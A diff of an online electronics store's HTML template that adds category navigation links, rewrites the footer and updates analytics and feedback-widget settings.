+																																<a lass="lnkBlak" href="category/mobile-phones" class="lnkBlak">
+										Mobile Phones
+									</a>
+																	&nbsp;
+																	<br>
+												
+						</td>
+																
+					<!--tr bgcolor="#f6f6f6"><td style="border-bottom: 1px solid rgb(231, 231, 231);"><a href="customer/account/edit" class="account">Account Information</a></td></tr-->
+
+						</tr><tr>
+							 <td width="5"><img src="/published/SC/html/scripts/images/spacer.gif" width="1" height="1"></td>
+							 <td width="25" align="center">
+																	<img src="/published/SC/html/scripts/images/aeroGray.jpg" width="5" height="5">
+								&nbsp;
+							</td>
+							<td tyle="border-bottom: 1px solid #FF0000;">
+																					
+																																<a lass="lnkBlak" href="category/mobile_accessories" class="lnkBlak">
+										Mobile Accessories
+									</a>
+																	&nbsp;
+																	<br>
+												
+						</td>
+																
+					<!--tr bgcolor="#f6f6f6"><td style="border-bottom: 1px solid rgb(231, 231, 231);"><a href="customer/account/edit" class="account">Account Information</a></td></tr-->
+
+						</tr><tr>
+							 <td width="5"><img src="/published/SC/html/scripts/images/spacer.gif" width="1" height="1"></td>
+							 <td width="25" align="center">
+																	<img src="/published/SC/html/scripts/images/aeroGray.jpg" width="5" height="5">
+								&nbsp;
+							</td>
+							<td tyle="border-bottom: 1px solid #FF0000;">
+																					
+																																<a lass="lnkBlak" href="category/desktops-laptops-online" class="lnkBlak">
+										Laptops &amp; Netbooks
+									</a>
+																	&nbsp;
+																	<br>
+												
+						</td>
+																
+					<!--tr bgcolor="#f6f6f6"><td style="border-bottom: 1px solid rgb(231, 231, 231);"><a href="customer/account/edit" class="account">Account Information</a></td></tr-->
+
+						</tr><tr>
+							 <td width="5"><img src="/published/SC/html/scripts/images/spacer.gif" width="1" height="1"></td>
+							 <td width="25" align="center">
+																	<img src="/published/SC/html/scripts/images/aeroGray.jpg" width="5" height="5">
+								&nbsp;
+							</td>
+							<td tyle="border-bottom: 1px solid #FF0000;">
+																					
+																																<a lass="lnkBlak" href="category/mp3-players" class="lnkBlak">
+										MP3 Players
+									</a>
+																	&nbsp;
+																	<br>
+												
+						</td>
+																
+					<!--tr bgcolor="#f6f6f6"><td style="border-bottom: 1px solid rgb(231, 231, 231);"><a href="customer/account/edit" class="account">Account Information</a></td></tr-->
+
+						</tr><tr>
+							 <td width="5"><img src="/published/SC/html/scripts/images/spacer.gif" width="1" height="1"></td>
+							 <td width="25" align="center">
+																	<img src="/published/SC/html/scripts/images/aeroGray.jpg" width="5" height="5">
+								&nbsp;
+							</td>
+							<td tyle="border-bottom: 1px solid #FF0000;">
+																					
+																																<a lass="lnkBlak" href="category/mp3_accessories" class="lnkBlak">
+										MP3 Accessories
+									</a>
+																	&nbsp;
+																	<br>
+												
+						</td>
+																
+					<!--tr bgcolor="#f6f6f6"><td style="border-bottom: 1px solid rgb(231, 231, 231);"><a href="customer/account/edit" class="account">Account Information</a></td></tr-->
+
+						</tr><tr>
+							 <td width="5"><img src="/published/SC/html/scripts/images/spacer.gif" width="1" height="1"></td>
+							 <td width="25" align="center">
+																	<img src="/published/SC/html/scripts/images/aeroGray.jpg" width="5" height="5">
+								&nbsp;
+							</td>
+							<td tyle="border-bottom: 1px solid #FF0000;">
+																					
+																																<a lass="lnkBlak" href="category/storage_devices" class="lnkBlak">
+										Storage Devices
+									</a>
+																	&nbsp;
+																	<br>
+												
+						</td>
+																
+					<!--tr bgcolor="#f6f6f6"><td style="border-bottom: 1px solid rgb(231, 231, 231);"><a href="customer/account/edit" class="account">Account Information</a></td></tr-->
+
+						</tr><tr>
+							 <td width="5"><img src="/published/SC/html/scripts/images/spacer.gif" width="1" height="1"></td>
+							 <td width="25" align="center">
+																	<img src="/published/SC/html/scripts/images/aeroGray.jpg" width="5" height="5">
+								&nbsp;
+							</td>
+							<td tyle="border-bottom: 1px solid #FF0000;">
+																					
+																																<a lass="lnkBlak" href="category/portable-entertainment" class="lnkBlak">
+										Portable Entertainment
+									</a>
+																	&nbsp;
+																	<br>
+												
+						</td>
+																
+					<!--tr bgcolor="#f6f6f6"><td style="border-bottom: 1px solid rgb(231, 231, 231);"><a href="customer/account/edit" class="account">Account Information</a></td></tr-->
+
+						</tr><tr>
+							 <td width="5"><img src="/published/SC/html/scripts/images/spacer.gif" width="1" height="1"></td>
+							 <td width="25" align="center">
+																	<img src="/published/SC/html/scripts/images/aeroGray.jpg" width="5" height="5">
+								&nbsp;
+							</td>
+							<td tyle="border-bottom: 1px solid #FF0000;">
+																					
+																																<a lass="lnkBlak" href="category/lcd_tvs" class="lnkBlak">
+										LCD TVs
+									</a>
+																	&nbsp;
+																	<br>
+												
+						</td>
+																
+					<!--tr bgcolor="#f6f6f6"><td style="border-bottom: 1px solid rgb(231, 231, 231);"><a href="customer/account/edit" class="account">Account Information</a></td></tr-->
+
+						</tr><tr>
+							 <td width="5"><img src="/published/SC/html/scripts/images/spacer.gif" width="1" height="1"></td>
+							 <td width="25" align="center">
+																	<img src="/published/SC/html/scripts/images/aeroGray.jpg" width="5" height="5">
+								&nbsp;
+							</td>
+							<td tyle="border-bottom: 1px solid #FF0000;">
+																					
+																																<a lass="lnkBlak" href="category/home-appliances" class="lnkBlak">
+										Home Appliances
+									</a>
+																	&nbsp;
+																	<br>
+												
+						</td>
+																
+					<!--tr bgcolor="#f6f6f6"><td style="border-bottom: 1px solid rgb(231, 231, 231);"><a href="customer/account/edit" class="account">Account Information</a></td></tr-->
+
+						</tr><tr>
+							 <td width="5"><img src="/published/SC/html/scripts/images/spacer.gif" width="1" height="1"></td>
+							 <td width="25" align="center">
+																	<img src="/published/SC/html/scripts/images/aeroGray.jpg" width="5" height="5">
+								&nbsp;
+							</td>
+							<td tyle="border-bottom: 1px solid #FF0000;">
+																					
+																																<a lass="lnkBlak" href="category/electronic-accessories" class="lnkBlak">
+										Accessories
+									</a>
+																	&nbsp;
+																	<br>
+												
+						</td>
+																
+					<!--tr bgcolor="#f6f6f6"><td style="border-bottom: 1px solid rgb(231, 231, 231);"><a href="customer/account/edit" class="account">Account Information</a></td></tr-->
+
+						</tr><tr>
+							 <td width="5"><img src="/published/SC/html/scripts/images/spacer.gif" width="1" height="1"></td>
+							 <td width="25" align="center">
+																	<img src="/published/SC/html/scripts/images/aeroGray.jpg" width="5" height="5">
+								&nbsp;
+							</td>
+							<td tyle="border-bottom: 1px solid #FF0000;">
+																					
+																																<a lass="lnkBlak" href="category/computer-peripherals" class="lnkBlak">
+										Computer Peripherals
+									</a>
+																	&nbsp;
+																	<br>
+												
+						</td>
+																
+					<!--tr bgcolor="#f6f6f6"><td style="border-bottom: 1px solid rgb(231, 231, 231);"><a href="customer/account/edit" class="account">Account Information</a></td></tr-->
+
+						</tr><tr>
+							 <td width="5"><img src="/published/SC/html/scripts/images/spacer.gif" width="1" height="1"></td>
+							 <td width="25" align="center">
+																	<img src="/published/SC/html/scripts/images/aeroGray.jpg" width="5" height="5">
+								&nbsp;
+							</td>
+							<td tyle="border-bottom: 1px solid #FF0000;">
+																					
+																																<a lass="lnkBlak" href="category/gamings" class="lnkBlak">
+										Gaming
 									</a>
 																	&nbsp;
 																	<br>
@@ -900,7 +948,7 @@ Description        : Code for include the files for left,right,top navigation 	*
 					
 				</tr>
 			</tbody></table>
-			
+						
 						
 		</td>
 		<td width="8"></td> 
@@ -1125,17 +1173,39 @@ Description        : Code for display center content details           		*
 <tr bgcolor="#FFFFFF">
 	<td height="2" bgcolor="#d6d6d6"></td>
 </tr>
-<tr bgcolor="#FFFFFF"><td class="bgFooter">
+<tr bgcolor="#FFFFFF">
+<td>
+<p><style type="text/css">
+<!--
+.style1 {
+	font-family: Arial, Helvetica, sans-serif;
+	font-size: 12px;
+	font-weight: bold;
+}
+-->
+</style></p>
+<table border="0" width="100%">
+    <tbody>
+        <tr>
+            <td align="center" class="bgFooter">Copyright @ 2010 smartshoppers.in All right Reserved <br>
+            <a href="/" class="topLinks">Home</a> &nbsp; | &nbsp; <a href="auxpage_1" class="topLinks">About Us</a> &nbsp; | &nbsp; <a href="auxpage_5" class="topLinks">Privacy Policy</a> &nbsp; |&nbsp; <a href="auxpage_6" class="topLinks">Help / FAQ</a> &nbsp; | &nbsp; <a href="auxpage_7" class="topLinks">Shipping Policy</a> &nbsp; | &nbsp; <a href="auxpage_8" class="topLinks">Disclaimer</a> &nbsp; | &nbsp; <a href="auxpage_4" class="topLinks">Terms &amp; Condition</a> &nbsp; | &nbsp; <a href="feedback" class="topLinks">Feed Back</a></td>
+        </tr>
+    </tbody>
+</table>
+<!--<td class="bgFooter">
 copyright @2008 smartshoppers.in All right Reserved
-	<br><a href="http://www.smartshoppers.in/" class="topLinks">Home</a> &nbsp; | &nbsp;
- 	<a href="http://www.smartshoppers.in/auxpage_1" class="topLinks">About Us</a> &nbsp; | &nbsp;
- 	<a href="http://www.smartshoppers.in/auxpage_5" class="topLinks">Privacy Policy</a> &nbsp; | &nbsp;
- 	<a href="http://www.smartshoppers.in/auxpage_6" class="topLinks">Help / FAQ</a> &nbsp; | &nbsp;
- 	<a href="http://www.smartshoppers.in/auxpage_7" class="topLinks">Shipping Policy</a> &nbsp; | &nbsp; 
- 	<a href="http://www.smartshoppers.in/auxpage_8" class="topLinks">Disclaimer</a> &nbsp; | &nbsp; 
- 	<a href="http://www.smartshoppers.in/auxpage_4" class="topLinks">Terms &amp; Condition</a> &nbsp; | &nbsp; 
- 	<a href="http://www.smartshoppers.in/feedback" class="topLinks">Feed Back</a>
- </td></tr>
+	<Br /><a href="http://smartshoppers.in/" class="topLinks">Home</a> &nbsp; | &nbsp;
+ 	<a href="http://smartshoppers.in/auxpage_1" class="topLinks">About Us</a> &nbsp; | &nbsp;
+ 	<a href="http://smartshoppers.in/auxpage_5" class="topLinks">Privacy Policy</a> &nbsp; | &nbsp;
+ 	<a href="http://smartshoppers.in/auxpage_6" class="topLinks">Help / FAQ</a> &nbsp; | &nbsp;
+ 	<a href="http://smartshoppers.in/auxpage_7" class="topLinks">Shipping Policy</a> &nbsp; | &nbsp; 
+ 	<a href="http://smartshoppers.in/auxpage_8" class="topLinks">Disclaimer</a> &nbsp; | &nbsp; 
+ 	<a href="http://smartshoppers.in/auxpage_4" class="topLinks">Terms & Condition</a> &nbsp; | &nbsp; 
+ 	<a href="http://smartshoppers.in/feedback" class="topLinks">Feed Back</a>
+-->
+ </td>
+ 
+ </tr>
  
 			<!-- END : Footer Container -->
 			
@@ -1147,13 +1217,13 @@ copyright @2008 smartshoppers.in All right Reserved
 		<script src="http://www.google-analytics.com/urchin.js" type="text/javascript">
 		</script>
 		<script type="text/javascript">
-		  _uacct="UA-9750770-1";
+		  _uacct="UA-9750770-6";
 		  urchinTracker();
 		</script>
 	
 	<!--Start Kampyle Feedback Form Button-->
-	<div id="k_close_button" class="k_float kc_bottom kc_right"></div><div><a href="http://www.smartshoppers.in/index.php?ukey=feedback" id="kampylink" class="k_float k_bottom k_right"><img src="/published/SC/html/scripts/images/smart_feedback.gif" alt="Feedback Form" border="0"></a></div>
-<!--	<div id="k_close_button" class="k_float kc_bottom kc_right"></div><div><a href="http://www.smartshoppers.in/index.php?ukey=feedback"><img src="/published/SC/html/scripts/images/smart_feedback.gif" alt="Feedback Form" border="0"/></a></div>-->
+	<div id="k_close_button" class="k_float kc_bottom kc_right"></div><div><a href="http://smartshoppers.in/index.php?ukey=feedback" id="kampylink" class="k_float k_bottom k_right"><img src="/published/SC/html/scripts/images/smart_feedback.gif" alt="Feedback Form" border="0"></a></div>
+<!--	<div id="k_close_button" class="k_float kc_bottom kc_right"></div><div><a href="http://smartshoppers.in/index.php?ukey=feedback"><img src="/published/SC/html/scripts/images/smart_feedback.gif" alt="Feedback Form" border="0"/></a></div>-->
 	<script src="http://cf.kampyle.com/k_button.js" type="text/javascript"></script>
 	<script type="text/javascript" src="http://cf.kampyle.com/k_push.js"></script>
 	<!--End Kampyle Feedback Form Button-->	
